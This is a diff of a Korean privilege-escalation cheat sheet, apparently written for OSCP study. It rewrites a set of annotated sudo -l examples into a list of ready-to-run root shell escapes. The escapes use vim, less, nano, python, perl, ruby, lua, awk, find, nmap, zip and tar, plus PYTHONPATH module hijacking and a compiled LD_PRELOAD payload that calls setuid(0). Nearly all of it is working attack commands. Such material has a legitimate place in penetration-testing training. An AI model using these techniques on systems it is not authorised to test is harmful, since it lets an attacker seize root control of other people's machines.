@@ -1,103 +1,107 @@
-# sudo를 이용한 권한 상승 방법 (OSCP 수동 침투)
+# sudo 권한 상승
 
-## 1. sudo 권한 확인
+## 권한 확인
 
 ```bash
-sudo -l
+sudo -l        # 현재 사용자의 sudo 권한 확인 (필수)
+sudo -V        # sudo 버전 확인 (CVE 취약점 확인용)
 ```
 
-- 현재 사용자가 어떤 명령어를 sudo로 실행할 수 있는지 확인합니다.
-- NOPASSWD 옵션이 있으면 비밀번호 없이 실행 가능합니다.
-
-### sudo -l 출력 예시 및 해석
-
-#### 예시 1: 특정 명령어에 대한 NOPASSWD 권한
+## 주요 출력 형태
 
 ```
-$ sudo -l
-User testuser may run the following commands on hostname:
-    (ALL) NOPASSWD: /usr/bin/vim
+# 모든 명령어 실행 가능 (비밀번호 필요)
+(ALL : ALL) ALL
+
+# 모든 명령어 실행 가능 (비밀번호 불필요)
+(ALL) NOPASSWD: ALL
+
+# 특정 명령어만 실행 가능 (비밀번호 불필요)
+(ALL) NOPASSWD: /usr/bin/vim, /bin/bash
+
+# 특정 사용자로 실행
+(www-data) NOPASSWD: /usr/bin/python
+
+# 환경변수 설정 허용
+(ALL) SETENV: NOPASSWD: /usr/bin/python
 ```
 
-- **해석**: testuser는 비밀번호 없이(`NOPASSWD`) vim을 root 권한으로 실행 가능합니다.
-- **권한 상승 가능성**: 매우 높음. vim의 `:!` 명령을 통해 쉘 명령어 실행 가능.
-- **공격 벡터**: `sudo vim -c ':!/bin/bash'`
+## 바이너리별 권한 상승 기법
 
-#### 예시 2: 모든 명령어에 대한 권한 (비밀번호 필요)
+### 편집기/뷰어 활용
 
-```
-$ sudo -l
-User testuser may run the following commands on hostname:
-    (ALL : ALL) ALL
-```
+```bash
+# vim
+sudo vim -c ':!/bin/bash'
+sudo vim
+:set shell=/bin/bash
+:shell
 
-- **해석**: testuser는 모든 명령어를 root 권한으로 실행할 수 있지만, 비밀번호가 필요합니다.
-- **권한 상승 가능성**: 비밀번호를 알고 있다면 직접 `sudo bash`로 권한 상승 가능.
-- **공격 벡터**: `sudo /bin/bash` (비밀번호 입력 필요)
+# less / more / man
+sudo less /etc/hosts
+!/bin/bash
 
-#### 예시 3: 여러 명령어에 대한 NOPASSWD 권한
-
-```
-$ sudo -l
-User testuser may run the following commands on hostname:
-    (ALL) NOPASSWD: /usr/bin/find, /usr/bin/python
+# nano
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
 ```
 
-- **해석**: testuser는 비밀번호 없이 find와 python을 root 권한으로 실행 가능합니다.
-- **권한 상승 가능성**: 매우 높음. 두 가지 방법으로 쉘을 획득할 수 있음.
-- **공격 벡터**:
-  - `sudo find . -exec /bin/bash \; -quit`
-  - `sudo python -c 'import pty;pty.spawn("/bin/bash")'`
+### 프로그래밍/스크립팅 도구
 
-#### 예시 4: 특정 사용자로만 실행 가능한 명령어
+```bash
+# python
+sudo python -c 'import os; os.system("/bin/bash")'
+sudo python -c 'import pty; pty.spawn("/bin/bash")'
 
-```
-$ sudo -l
-User testuser may run the following commands on hostname:
-    (web_admin) NOPASSWD: /bin/systemctl restart apache2
-```
+# perl
+sudo perl -e 'exec "/bin/bash";'
 
-- **해석**: testuser는 비밀번호 없이 web_admin 사용자로 apache2 서비스 재시작 가능.
-- **권한 상승 가능성**: 제한적. apache2 서비스의 설정 파일을 수정할 수 있다면 가능.
-- **공격 벡터**: apache2 설정 파일에 reverse shell 코드를 삽입 후 서비스 재시작
+# ruby
+sudo ruby -e 'exec "/bin/bash"'
 
-#### 예시 5: 와일드카드가 포함된 명령어
+# lua
+sudo lua -e 'os.execute("/bin/bash")'
 
-```
-$ sudo -l
-User testuser may run the following commands on hostname:
-    (ALL) NOPASSWD: /usr/bin/zip * /tmp/backup.zip
+# awk
+sudo awk 'BEGIN {system("/bin/bash")}'
 ```
 
-- **해석**: testuser는 비밀번호 없이 zip 명령을 사용할 수 있으나, 첫 번째 인자에만 와일드카드 사용 가능.
-- **권한 상승 가능성**: 높음. zip의 -T 옵션을 이용해 명령 실행 가능.
-- **공격 벡터**: `sudo zip -T --unzip-command="sh -c /bin/bash" /tmp/backup.zip`
+### 파일/명령어 실행 도구
 
-#### 예시 6: 환경 변수 설정이 허용된 경우
+```bash
+# find
+sudo find / -name test -exec /bin/bash \; -quit
 
+# nmap (대화형 모드)
+sudo nmap --interactive
+!sh
+
+# zip/unzip
+sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+
+# tar
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 ```
-$ sudo -l
-User testuser may run the following commands on hostname:
-    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup_script.py
+
+### 환경 변수 활용
+
+```bash
+# PYTHONPATH 활용 (모듈 하이재킹)
+cd /tmp
+echo 'import os; os.system("/bin/bash")' > os.py
+sudo PYTHONPATH=/tmp python -c 'import os'
+
+# LD_PRELOAD 활용
+cat > /tmp/root.c << EOF
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() { setuid(0); system("/bin/bash"); }
+EOF
+gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
+sudo LD_PRELOAD=/tmp/root.so find
 ```
-
-- **해석**: testuser는 비밀번호 없이 환경 변수를 설정하며 python3으로 특정 스크립트 실행 가능.
-- **권한 상승 가능성**: 높음. PYTHONPATH 환경 변수를 조작하여 코드 실행 가능.
-- **공격 벡터**: `sudo PYTHONPATH=/tmp python3 /opt/backup_script.py` (모듈 하이재킹)
-
-### 출력 해석 방법
-
-1. `(ALL)`: 모든 사용자로 명령을 실행할 수 있음을 의미
-2. `(root)`: root 사용자로만 명령을 실행할 수 있음
-3. `NOPASSWD`: 비밀번호 없이 명령을 실행할 수 있음
-4. `ALL`: 모든 명령어를 실행할 수 있음
-
-## 2. 권한 상승 가능한 명령어 탐색
-
-- `sudo -l` 결과에서 다음과 같은 명령어가 있으면 권한 상승이 가능합니다.
-- 예시: `vim`, `nano`, `less`, `find`, `python`, `perl`, `awk`, `tar`, `bash`, `sh` 등
-
-### 권한 상승 가능 여부 판단 방법
 
 1. **쉘 직접 접근 명령어**: `/bin/bash`, `/bin/sh` 등이 있으면 직접 쉘 획득 가능
 2. **인터프리터**: `python`, `perl`, `ruby` 등이 있으면 코드 실행을 통해 쉘 획득 가능
